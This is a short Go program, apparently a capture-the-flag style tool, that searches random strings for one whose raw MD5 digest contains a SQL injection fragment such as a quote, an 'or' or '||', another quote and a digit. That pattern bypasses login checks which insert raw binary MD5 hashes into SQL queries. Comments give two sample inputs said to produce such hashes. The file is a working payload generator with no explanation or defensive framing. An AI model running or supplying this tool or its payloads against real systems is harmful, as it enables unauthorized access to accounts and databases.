package main

import (
	"crypto/md5"
	"fmt"
	"math/rand"
	"os"
	"sync"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?,.!@#$%^&*()+=-_[]{}|;:<>~")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

var st_end_val = []byte("\x27")
var mid_vals = [][]byte{[]byte("\x7c\x7c"), []byte("\x6f\x72"), []byte("\x4f\x52"), []byte("\x6f\x52"), []byte("\x4f\x72")}

func checkHash(x []byte) bool {
	hash := md5.Sum(x)
	for i := 0; i <= len(hash)-5; i++ {
		// check first quote
		if hash[i] != st_end_val[0] {
			continue
		}
		valid := false
		switch hash[i+1] {
		// case ||
		case mid_vals[0][0]:
			if hash[i+2] == mid_vals[0][1] {
				valid = true
			}
		// case or, oR
		case []byte("\x6f")[0]:
			if hash[i+2] == []byte("\x72")[0] ||
				hash[i+2] == []byte("\x52")[0] {
				valid = true
			}
		// case Or, OR
		case []byte("\x4f")[0]:
			if hash[i+2] == []byte("\x72")[0] ||
				hash[i+2] == []byte("\x52")[0] {
				valid = true
			}
		}
		if !valid {
			continue
		}
		// check second quote
		if hash[i+3] != st_end_val[0] {
			continue
		}
		// check for num != 0
		if 48 < hash[i+4] && hash[i+4] < 58 {
			return true
		}
	}
	return false
}

// test values (that produce good hashes)
// pw := []byte("100000000000000000000000000000539611092")
// pw := []byte("QS+02")

func genHashes() {
	for i := 0; true; i++ {
		pw := []byte(randSeq(5)) // 5 billion possible strings w 89 chars
		if checkHash(pw) {
			fmt.Println(string(pw[:]))
			fmt.Printf("checked %v hashes\n", i*2)
			os.Exit(3)
		}
	}
}

func main() {
	var wg sync.WaitGroup
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go func() {
			genHashes()
			wg.Done()
		}()
	}
	wg.Wait()
}
